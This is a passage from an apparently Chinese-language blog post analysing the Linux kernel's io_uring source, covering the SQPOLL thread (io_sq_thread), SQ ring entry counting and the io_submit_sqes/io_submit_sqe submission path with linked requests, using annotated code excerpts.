如果开启了syscall轮询模式,执行iopoll逻辑 </span></span><br><span class="line">			<span class="comment">/*</span></span><br><span class="line"><span class="comment">			 * We disallow the app entering submit/complete with</span></span><br><span class="line"><span class="comment">			 * polling, but we still need to lock the ring to</span></span><br><span class="line"><span class="comment">			 * prevent racing with polled issue that got punted to</span></span><br><span class="line"><span class="comment">			 * a workqueue.</span></span><br><span class="line"><span class="comment">			 */</span></span><br><span class="line">			mutex_lock(&amp;ctx-&gt;uring_lock);</span><br><span class="line">iopoll_locked:</span><br><span class="line">			ret2 = io_validate_ext_arg(flags, argp, argsz);</span><br><span class="line">			<span class="keyword">if</span> (likely(!ret2)) &#123;</span><br><span class="line">				min_complete = min(min_complete,</span><br><span class="line">						   ctx-&gt;cq_entries);</span><br><span class="line">				ret2 = io_iopoll_check(ctx, min_complete);</span><br><span class="line">			&#125;</span><br><span class="line">			mutex_unlock(&amp;ctx-&gt;uring_lock);</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="type">const</span> <span class="type">sigset_t</span> __user *sig;</span><br><span class="line">			<span class="class"><span class="keyword">struct</span> __<span class="title">kernel_timespec</span> __<span class="title">user</span> *<span class="title">ts</span>;</span></span><br><span class="line"></span><br><span class="line">			ret2 = io_get_ext_arg(flags, argp, &amp;argsz, &amp;ts, &amp;sig);</span><br><span class="line">			<span class="keyword">if</span> (likely(!ret2)) &#123;</span><br><span class="line">				min_complete = min(min_complete,</span><br><span class="line">						   ctx-&gt;cq_entries);</span><br><span class="line">				ret2 = io_cqring_wait(ctx, min_complete, sig,</span><br><span class="line">						      argsz, ts);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (!ret) &#123;</span><br><span class="line">			ret = ret2;</span><br><span class="line"></span><br><span class="line">			<span class="comment">/*</span></span><br><span class="line"><span class="comment">			 * EBADR indicates that one or more CQE were dropped.</span></span><br><span class="line"><span class="comment">			 * Once the user has been informed we can clear the bit</span></span><br><span class="line"><span class="comment">			 * as they are obviously ok with those drops.</span></span><br><span class="line"><span class="comment">			 */</span></span><br><span class="line">			<span class="keyword">if</span> (unlikely(ret2 == -EBADR))</span><br><span class="line">				clear_bit(IO_CHECK_CQ_DROPPED_BIT,</span><br><span class="line">					  &amp;ctx-&gt;check_cq);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>如果请求获取完成事件
<ul>
<li>如果开启了syscall轮询模式,执行iopoll逻辑</li>
<li>否则执行等待完成事件逻辑</li>
</ul>
</li>
</ul>
<h2 id="kernel-2">kernel</h2>
<p>最后是io_uring 内核的任务处理, 在这里先给出一个流程图, 然后再具体分析各个函数</p>
<p><img src="/images/io_uring.png" alt="io_uring"></p>
<p>图来自 <a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/380726590">https://zhuanlan.zhihu.com/p/380726590</a> , 侵删//</p>
<h3 id="io-sq-thread-内核任务提交机制"><code>io_sq_thread</code> | 内核任务提交机制</h3>
<p>io_sq_thread是 <code>SQPOLL</code> 模式下内核任务轮询线程.<br>
首先设置线程环境</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">io_sq_thread</span><span class="params">(<span class="type">void</span> *data)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">io_sq_data</span> *<span class="title">sqd</span> =</span> data;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">io_ring_ctx</span> *<span class="title">ctx</span>;</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> timeout = <span class="number">0</span>;</span><br><span class="line">	<span class="type">char</span> buf[TASK_COMM_LEN];</span><br><span class="line">	DEFINE_WAIT(wait);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">snprintf</span>(buf, <span class="keyword">sizeof</span>(buf), <span class="string">&quot;iou-sqp-%d&quot;</span>, sqd-&gt;task_pid);</span><br><span class="line">	set_task_comm(current, buf);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* reset to our pid after we&#x27;ve set task_comm, for fdinfo */</span></span><br><span class="line">	sqd-&gt;task_pid = current-&gt;pid;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (sqd-&gt;sq_cpu != <span class="number">-1</span>) &#123;</span><br><span class="line">		set_cpus_allowed_ptr(current, cpumask_of(sqd-&gt;sq_cpu));</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		set_cpus_allowed_ptr(current, cpu_online_mask);</span><br><span class="line">		sqd-&gt;sq_cpu = raw_smp_processor_id();</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
<p>接下来获取锁并进入无限循环</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mutex_lock(&amp;sqd-&gt;lock);</span><br><span class="line"><span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br></pre></td></tr></table></figure>
<p>设置好timeout</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (io_sqd_events_pending(sqd) || signal_pending(current)) &#123;</span><br><span class="line">	<span class="keyword">if</span> (io_sqd_handle_event(sqd))</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	timeout = jiffies + sqd-&gt;sq_thread_idle;</span><br><span class="line">	<span class="comment">// sq_thread_idle 来自用户在 params 设置的时间</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>注意到这个线程创建在内存分配好之后， 即，即使是第一次进入此线程， 如果 sqes对应内存有任务，也会处理任务， 意味着在 <code>io_uring_setup</code> 之前，在sqes写好的任务，也可以被处理</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">cap_entries = !list_is_singular(&amp;sqd-&gt;ctx_list);</span><br><span class="line"><span class="comment">// 获取是否有多个io_ring的标记cap_entries</span></span><br><span class="line">list_for_each_entry(ctx, &amp;sqd-&gt;ctx_list, sqd_list) &#123;</span><br><span class="line"><span class="comment">// 遍历注册的io_ring,调用__io_sq_thread做实际的轮询操作</span></span><br><span class="line">	<span class="type">int</span> ret = __io_sq_thread(ctx, cap_entries);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (!sqt_spin &amp;&amp; (ret &gt; <span class="number">0</span> || !wq_list_empty(&amp;ctx-&gt;iopoll_list)))</span><br><span class="line">		sqt_spin = <span class="literal">true</span>;</span><br><span class="line">		<span class="comment">//  如果有事件处理或iopoll任务,则设置sqt_spin标记</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (io_run_task_work())</span><br><span class="line"><span class="comment">// 调用io_run_task_work处理排队的工作任务</span></span><br><span class="line">	sqt_spin = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (sqt_spin || !time_after(jiffies, timeout)) &#123;</span><br><span class="line"><span class="comment">// 如果有待处理事件或时间没超时</span></span><br><span class="line">	<span class="keyword">if</span> (sqt_spin)</span><br><span class="line">		timeout = jiffies + sqd-&gt;sq_thread_idle;</span><br><span class="line">		<span class="comment">// 如果有待处理事件,更新下一次超时时间</span></span><br><span class="line">	<span class="keyword">if</span> (unlikely(need_resched())) &#123;</span><br><span class="line">	<span class="comment">// 检查是否需要调度,如果需要,主动释放并重新获取锁</span></span><br><span class="line">		mutex_unlock(&amp;sqd-&gt;lock);</span><br><span class="line">		cond_resched();</span><br><span class="line">		mutex_lock(&amp;sqd-&gt;lock);</span><br><span class="line">		sqd-&gt;sq_cpu = raw_smp_processor_id();</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">continue</span>;</span><br><span class="line">	<span class="comment">// 没超时就直接continue， 因为之后就是判断是否需要阻塞</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>接下来实现io_uring SQ线程的阻塞和唤醒逻辑</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">	prepare_to_wait(&amp;sqd-&gt;wait, &amp;wait, TASK_INTERRUPTIBLE);</span><br><span class="line">	<span class="comment">// 将当前线程设置为可中断状态TASK_INTERRUPTIBLE</span></span><br><span class="line">	<span class="keyword">if</span> (!io_sqd_events_pending(sqd) &amp;&amp; !task_work_pending(current)) &#123;</span><br><span class="line">		<span class="type">bool</span> needs_sched = <span class="literal">true</span>;</span><br><span class="line">		<span class="comment">// 检查是否有待处理事件和任务</span></span><br><span class="line"></span><br><span class="line">		list_for_each_entry(ctx, &amp;sqd-&gt;ctx_list, sqd_list) &#123;</span><br><span class="line">		<span class="comment">// 若没有则遍历所有注册的io_ring</span></span><br><span class="line">			atomic_or(IORING_SQ_NEED_WAKEUP,</span><br><span class="line">					&amp;ctx-&gt;rings-&gt;sq_flags);</span><br><span class="line">			<span class="comment">// 设置IORING_SQ_NEED_WAKEUP标志</span></span><br><span class="line">			<span class="keyword">if</span> ((ctx-&gt;flags &amp; IORING_SETUP_IOPOLL) &amp;&amp;</span><br><span class="line">			    !wq_list_empty(&amp;ctx-&gt;iopoll_list)) &#123;</span><br><span class="line">			    <span class="comment">// 检查iopoll和SQ队列是否为空</span></span><br><span class="line">				needs_sched = <span class="literal">false</span>;</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">			<span class="comment">/*</span></span><br><span class="line"><span class="comment">			 * Ensure the store of the wakeup flag is not</span></span><br><span class="line"><span class="comment">			 * reordered with the load of the SQ tail</span></span><br><span class="line"><span class="comment">			 */</span></span><br><span class="line">			smp_mb__after_atomic();</span><br><span class="line"></span><br><span class="line">			<span class="keyword">if</span> (io_sqring_entries(ctx)) &#123;</span><br><span class="line">				needs_sched = <span class="literal">false</span>;</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (needs_sched) &#123;</span><br><span class="line">		<span class="comment">// 如果需要调度</span></span><br><span class="line">			mutex_unlock(&amp;sqd-&gt;lock);</span><br><span class="line">			<span class="comment">// 释放锁调度</span></span><br><span class="line">			schedule();</span><br><span class="line">			mutex_lock(&amp;sqd-&gt;lock);</span><br><span class="line">			<span class="comment">// 唤醒后重新获取锁和CPU信息</span></span><br><span class="line">			sqd-&gt;sq_cpu = raw_smp_processor_id();</span><br><span class="line">		&#125;</span><br><span class="line">		list_for_each_entry(ctx, &amp;sqd-&gt;ctx_list, sqd_list)</span><br><span class="line">			<span class="type">atomic_andnot</span>(IORING_SQ_NEED_WAKEUP,</span><br><span class="line">					&amp;ctx-&gt;rings-&gt;sq_flags);</span><br><span class="line">		<span class="comment">// 否则清除唤醒标记</span></span><br><span class="line">	&#125;</span><br><span class="line">	finish_wait(&amp;sqd-&gt;wait, &amp;wait);</span><br><span class="line">	timeout = jiffies + sqd-&gt;sq_thread_idle;</span><br><span class="line">	<span class="comment">// 更新等待时间</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>最后是退出无限循环时的清理机制</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">io_uring_cancel_generic(<span class="literal">true</span>, sqd);</span><br><span class="line">sqd-&gt;thread = <span class="literal">NULL</span>;</span><br><span class="line">list_for_each_entry(ctx, &amp;sqd-&gt;ctx_list, sqd_list)</span><br><span class="line">	atomic_or(IORING_SQ_NEED_WAKEUP, &amp;ctx-&gt;rings-&gt;sq_flags);</span><br><span class="line">io_run_task_work();</span><br><span class="line">mutex_unlock(&amp;sqd-&gt;lock);</span><br><span class="line"></span><br><span class="line">complete(&amp;sqd-&gt;exited);</span><br><span class="line">do_exit(<span class="number">0</span>);</span><br></pre></td></tr></table></figure>
<h4 id="io-sq-thread"><code>__io_sq_thread</code></h4>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> __io_sq_thread(<span class="keyword">struct</span> io_ring_ctx *ctx, <span class="type">bool</span> cap_entries)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> to_submit;</span><br><span class="line">	<span class="type">int</span> ret = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	to_submit = io_sqring_entries(ctx);</span><br><span class="line">	<span class="comment">/* if we&#x27;re handling multiple rings, cap submit size for fairness */</span></span><br><span class="line">	<span class="keyword">if</span> (cap_entries &amp;&amp; to_submit &gt; IORING_SQPOLL_CAP_ENTRIES_VALUE)</span><br><span class="line">		to_submit = IORING_SQPOLL_CAP_ENTRIES_VALUE;</span><br><span class="line">	<span class="comment">// 计算需要提交的任务数量</span></span><br><span class="line">	<span class="comment">// 如果需要公平,则 cap 为固定最大值</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (!wq_list_empty(&amp;ctx-&gt;iopoll_list) || to_submit) &#123;</span><br><span class="line">	<span class="comment">// 如果有 iopoll 任务或可提交请求</span></span><br><span class="line">		<span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> *<span class="title">creds</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (ctx-&gt;sq_creds != current_cred())</span><br><span class="line">			creds = override_creds(ctx-&gt;sq_creds);</span><br><span class="line">		<span class="comment">// 保存和恢复 creds 身份信息避免安全漏洞</span></span><br><span class="line">		mutex_lock(&amp;ctx-&gt;uring_lock);</span><br><span class="line">		<span class="comment">// 上锁保护关键区</span></span><br><span class="line">		<span class="keyword">if</span> (!wq_list_empty(&amp;ctx-&gt;iopoll_list))</span><br><span class="line">			io_do_iopoll(ctx, <span class="literal">true</span>);</span><br><span class="line">		<span class="comment">// 处理 iopoll 轮询事件</span></span><br><span class="line">		<span class="comment">/*</span></span><br><span class="line"><span class="comment">		 * Don&#x27;t submit if refs are dying, good for io_uring_register(),</span></span><br><span class="line"><span class="comment">		 * but also it is relied upon by io_ring_exit_work()</span></span><br><span class="line"><span class="comment">		 */</span></span><br><span class="line">		<span class="keyword">if</span> (to_submit &amp;&amp; likely(!percpu_ref_is_dying(&amp;ctx-&gt;refs)) &amp;&amp;</span><br><span class="line">		    !(ctx-&gt;flags &amp; IORING_SETUP_R_DISABLED))</span><br><span class="line">			ret = io_submit_sqes(ctx, to_submit);</span><br><span class="line">			<span class="comment">// 提交请求到 SQ 环</span></span><br><span class="line">		mutex_unlock(&amp;ctx-&gt;uring_lock);</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (to_submit &amp;&amp; wq_has_sleeper(&amp;ctx-&gt;sqo_sq_wait))</span><br><span class="line">			wake_up(&amp;ctx-&gt;sqo_sq_wait);</span><br><span class="line">			<span class="comment">// 唤醒 sqo_sq 等待线程</span></span><br><span class="line">		<span class="keyword">if</span> (creds)</span><br><span class="line">			revert_creds(creds);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>其中 <code>io_sqring_entries</code>  逻辑如下</p>
<p>所以内核在SQPOLL 模式下判断是否有任务需要执行，就是看 tail 是否更新</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">unsigned</span> <span class="type">int</span> <span class="title function_">io_sqring_entries</span><span class="params">(<span class="keyword">struct</span> io_ring_ctx *ctx)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">io_rings</span> *<span class="title">rings</span> =</span> ctx-&gt;rings;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> entries;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* make sure SQ entry isn&#x27;t read before tail */</span></span><br><span class="line">	entries = smp_load_acquire(&amp;rings-&gt;sq.tail) - ctx-&gt;cached_sq_head;</span><br><span class="line">	<span class="keyword">return</span> min(entries, ctx-&gt;sq_entries);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="io-submit-sqes"><code>io_submit_sqes</code></h4>
<p>最后是真正的提交请求函数</p>
<p>计算需要提交的sqes并跟踪状态</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">io_submit_sqes</span><span class="params">(<span class="keyword">struct</span> io_ring_ctx *ctx, <span class="type">unsigned</span> <span class="type">int</span> nr)</span></span><br><span class="line">	__<span class="title function_">must_hold</span><span class="params">(&amp;ctx-&gt;uring_lock)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> entries = io_sqring_entries(ctx);</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> left;</span><br><span class="line">	<span class="type">int</span> ret;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (unlikely(!entries))</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	<span class="comment">/* make sure SQ entry isn&#x27;t read before tail */</span></span><br><span class="line">	ret = left = min(nr, entries);</span><br><span class="line">	io_get_task_refs(left);</span><br><span class="line">	io_submit_state_start(&amp;ctx-&gt;submit_state, left);</span><br></pre></td></tr></table></figure>
<p>循环处理每个sqes</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">do</span> &#123;</span><br><span class="line">	<span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">io_uring_sqe</span> *<span class="title">sqe</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">io_kiocb</span> *<span class="title">req</span>;</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (unlikely(!io_alloc_req(ctx, &amp;req)))</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">if</span> (unlikely(!io_get_sqe(ctx, &amp;sqe))) &#123;</span><br><span class="line">		io_req_add_to_cache(req, ctx);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// 为每个SQE分配并初始化io_kiocb请求 </span></span><br><span class="line">	<span class="keyword">if</span> (unlikely(io_submit_sqe(ctx, req, sqe)) &amp;&amp;</span><br><span class="line">	<span class="comment">// 真正的提交</span></span><br><span class="line">	    !(ctx-&gt;flags &amp; IORING_SETUP_SUBMIT_ALL)) &#123;</span><br><span class="line">		left--;</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125; <span class="keyword">while</span> (--left);</span><br></pre></td></tr></table></figure>
<h4 id="io-submit-sqe"><code>io_submit_sqe</code></h4>
<p>这个函数比较关键的是对于同步的处理, 我们知道, <code>io_uring</code>  是异步的, 任务处理的顺序不一定是按照提交的顺序, 但是,  如果 sqe 的 flag字段设置了  <code>IOSQE_IO_LINK</code> , 那么任务就会挂在一条链上, 直到一个任务没有此flag, 而链上的任务的执行是有先后顺序</p>
<p>同时, 要理解, <code>ctx-&gt;sumit_state.link</code> 是一个循环链表, 由 <code>io_kiocb</code>  组成, 每个 <code>io_kiocb</code>  的link成员指向下一个 <code>io_kiocb</code>  结构</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">int</span> <span class="title function_">io_submit_sqe</span><span class="params">(<span class="keyword">struct</span> io_ring_ctx *ctx, <span class="keyword">struct</span> io_kiocb *req, <span class="type">const</span> <span class="keyword">struct</span> io_uring_sqe *sqe)</span></span><br><span class="line">	__<span class="title function_">must_hold</span><span class="params">(&amp;ctx-&gt;uring_lock)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">io_submit_link</span> *<span class="title">link</span> =</span> &amp;ctx-&gt;submit_state.link;</span><br><span class="line">	<span class="type">int</span> ret;</span><br><span class="line"></span><br><span class="line">	ret = io_init_req(ctx, req, sqe);</span><br><span class="line">	<span class="comment">// 初始化并校验SQE请求req </span></span><br><span class="line">	<span class="keyword">if</span> (unlikely(ret))</span><br><span class="line">		<span class="keyword">return</span> io_submit_fail_init(sqe, req, ret);</span><br><span class="line">		<span class="comment">// 如果已有链头或者SQE标记了链接标志</span></span><br><span class="line"></span><br><span class="line">	trace_io_uring_submit_req(req);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * If we already have a head request, queue this one for async</span></span><br><span class="line"><span class="comment">	 * submittal once the head completes. If we don&#x27;t have a head but</span></span><br><span class="line"><span class="comment">	 * IOSQE_IO_LINK is set in the sqe, start a new head. This one will be</span></span><br><span class="line"><span class="comment">	 * submitted sync once the chain is complete. If none of those</span></span><br><span class="line"><span class="comment">	 * conditions are true (normal request), then just queue it.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">if</span> (unlikely(link-&gt;head)) &#123;</span><br><span class="line">	<span class="comment">// 如果链表已经有了一个head 请求, 意味着之前sqe 有 `IOSQE_IO_LINK` 标志</span></span><br><span class="line">		ret = io_req_prep_async(req);</span><br><span class="line">		<span class="comment">// 准备异步提交状态</span></span><br><span class="line">		<span class="keyword">if</span> (unlikely(ret))</span><br><span class="line">			<span class="keyword">return</span> io_submit_fail_init(sqe, req, ret);</span><br><span class="line">			</span><br><span class="line">		trace_io_uring_link(req, link-&gt;head);</span><br><span class="line">		link-&gt;last-&gt;link = req;</span><br><span class="line">		link-&gt;last = req;</span><br><span class="line">		<span class="comment">// 将本项挂载到链表</span></span><br><span class="line">		</span><br><span class="line">		<span class="keyword">if</span> (req-&gt;flags &amp; IO_REQ_LINK_FLAGS)</span><br><span class="line">			<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">			<span class="comment">// 如果此项没有 LINK 标志, 清空 链表</span></span><br><span class="line">		<span class="comment">/* last request of the link, flush it */</span></span><br><span class="line">		req = link-&gt;head;</span><br><span class="line">		link-&gt;head = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (req-&gt;flags &amp; (REQ_F_FORCE_ASYNC | REQ_F_FAIL))</span><br><span class="line">			<span class="keyword">goto</span> fallback;</span><br><span class="line"></span><br><span class="line">	&#125; <span class="keyword">else</span> <span class="keyword">if</span> (unlikely(req-&gt;flags &amp; (IO_REQ_LINK_FLAGS |</span><br><span class="line">					  REQ_F_FORCE_ASYNC | REQ_F_FAIL))) &#123;</span><br><span class="line">		<span class="comment">// 如果之前的任务没有LINK 标记, 但此任务有, 给链表添加一个头</span></span><br><span class="line">		<span class="keyword">if</span> (req-&gt;flags &amp; IO_REQ_LINK_FLAGS) &#123;</span><br><span class="line">			link-&gt;head = req;</span><br><span class="line">			link-&gt;last = req;</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">fallback:  </span><br><span class="line">			<span class="comment">// 加入降级提交fallback队列</span></span><br><span class="line">			io_queue_sqe_fallback(req);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// 加入普通提交队列</span></span><br><span class="line">	io_queue_sqe(req);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="io-queue-sqe-io-issue-sqe-重要"><code>io_queue_sqe</code> | <code>io_issue_sqe</code> | 重要</h4>
